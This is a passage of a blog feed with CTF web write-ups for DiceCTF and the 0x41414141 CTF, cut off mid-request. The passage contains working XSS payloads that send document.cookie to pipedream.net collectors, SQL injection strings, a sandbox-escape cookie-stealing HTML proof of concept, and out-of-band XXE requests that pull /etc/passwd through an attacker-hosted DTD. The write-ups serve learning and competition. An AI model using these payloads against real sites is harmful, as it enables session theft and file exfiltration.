nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;location.href&#x3D;&quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;%2bdocument.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote><hr><h2 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title=" (Web) Missing Flavortext [111 pts]"></a><span style="color:#21C587"></span> (Web) Missing Flavortext [111 pts]</h2><blockquote><p> The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.body.username, req.body.password].some(<span class="function"><span class="params">v</span> =&gt;</span> v.includes(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[]&#x3D;1&amp;password[]&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p></blockquote><hr><h2 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title=" (Web) Web Utils [121 pts]"></a><span style="color:#21C587"></span> (Web) Web Utils [121 pts]</h2><blockquote><p>TThe Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> id = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! id) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`<span class="subst">$&#123;<span class="built_in">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.json();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="built_in">window</span>.location = data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">document</span>.readyState !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).textContent = data;</span></span><br><span class="line">    &#125;)()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as <code>javascript:alert(1)</code>, you can trigger xss.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.post(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.test(req.body.data))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the link creation logic, the value of <code>req.body.data</code> is verified with a regular expression. So, you can’t put xss payload in the link creation logic.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.post(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      database.addData(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.body, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .code(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href&#x3D;&#39;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;&#39;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br>   </p><blockquote><p>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}</p></blockquote><hr><h2 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title=" (Web) Build a Panel [130 pts]"></a><span style="color:#21C587"></span> (Web) Build a Panel [130 pts]</h2><blockquote><p> The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.cookies;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.run(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">                res.send(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.<br></p><p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains <code>FLAG</code>. (panelid is stored in a cookie.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;build-a-panel.dicec.tf&#x2F;admin&#x2F;debug&#x2F;add_widget?panelid&#x3D;pocas&amp;widgetname&#x3D;adfdaf&amp;widgetdata&#x3D;a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#39;)--</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}</p></blockquote><hr><h2 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title=" (Web) Web IDE [196 pts]"></a><span style="color:#21C587"></span> (Web) Web IDE [196 pts]</h2><blockquote><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p></blockquote><ul><li>Scenario<br></li></ul><ol><li>We are using <code>allow-scripts</code> as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li><li>The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li><li>So, first you need to create a separate site and bypass the iframe sandbox.</li><li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li><li>However, since xss payload is executed in <code>/sandbox.html</code>, it cannot read the admin cookie.</li><li>So, create an object using <code>window.open(&quot;/ide&quot;)</code>, and execute xss payload on the object to steal the cookie.<br></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/team.png?raw=true"></p><p>2021년 1월 26일 저녁에 <code>Ainsetin</code>님이 씨텝 같이 하자고 하셔서 31일까지 참여를 했었는데 많은 도움이 되지 못 한 거 같아 스스로 반성을 많이 한 대회입니다. 여튼 이번 대회에는 버스를 타서 14등을 했고, 솔브수가 그나마 적은 웹 3 문제의 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Special-Order-pt2-490-pts"><a href="#Web-Special-Order-pt2-490-pts" class="headerlink" title=" (Web) Special Order pt2 [490 pts]"></a><span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]</h2><blockquote><p>Special Order pt2 문제는 웹 애플리케이션 취약점을 찾고, OOB XXE를 이용해서 flag를 긁어오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.45.25.png?raw=true"></p><p>문제로 들어오면 login 폼이 보이고, 바로 밑에 회원 가입 링크가 있는 것을 볼 수 있습니다. 그러니 그냥 가입하고, 로그인을 해주면 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.46.15.png?raw=true"></p><p>로그인을 하고 들어오면 <code>special Order</code> 블로그가 나오는 것을 볼 수 있고, 위에 보면 <code>HOME</code>, <code>POST</code>, <code>POST SETTING</code>, <code>CREATE POST</code>가 있는 것을 볼 수 있습니다. 취약점은 <code>POST SETTING</code>에서 터집니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.46.34.png?raw=true"></p><p><code>POST SETTING</code>로 들어오면 폰트 색상과 폰트 사이즈를 정해서 보낼 수 있습니다. 한 번 요청을 보내 헤더를 잡아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:50:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">DONE :D</span><br></pre></td></tr></table></figure><p>요청 헤더를 보면 색상과 사이즈를 json으로 보내는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:52:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Start tag expected, &#39;&lt;&#39; not found, line 1, column 1 (&lt;string&gt;, line 1)</span><br></pre></td></tr></table></figure><p>여기서 Content-Type을 <code>application/xml</code>로 바꿔서 보내주면 XML Parsing 에러가 나는 것을 볼 수 있습니다. 이 말은 XML이 작동 중이며 XXE 공격이 가능하다는 소리입니다. 일단 색상과 사이즈의 크기는 응답에 포함되지 않기 때문에 일반적인 XXE 기법을 이용할 순 없습니다. 그래서 <code>Out-of-band XXE</code> 기법을 이용하기로 했고, 해당 기법을 쓸려면 일단 DTD를 로드 할 수 있는 지 확인해야합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 175</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE pocas [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;test&quot;&gt;]&gt;</span><br><span class="line">&lt;pocas&gt;</span><br><span class="line">    &lt;color&gt;&amp;xxe;&lt;&#x2F;color&gt;</span><br><span class="line">    &lt;size&gt;40px&lt;&#x2F;size&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Aapache Log</span><br><span class="line">207.180.200.166 - - [31&#x2F;Jan&#x2F;2021:12:14:10 +0000] &quot;GET &#x2F;test HTTP&#x2F;1.0&quot; 404 456 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>확인을 해보니 잘 되는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 170</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:04:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 1343</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">(생략)</span><br><span class="line">guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">uwsgi:x:100:101:uwsgi:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>처음 해보는 기법이라 해외 <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">블로그</a>를 보며 공부를 하고, 진행했는데 좀 신기했습니다. 여튼 oob xxe를 이용해서 <code>/etc/passwd</code>를 긁어오니 잘 긁어오는 것을 볼 수 있습니다. 이제 FLAG가 들어있는 파일만 읽으면 되는데 파일을 모르니 한 번 찾아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 168</span><br><span class="line">Content-Type: 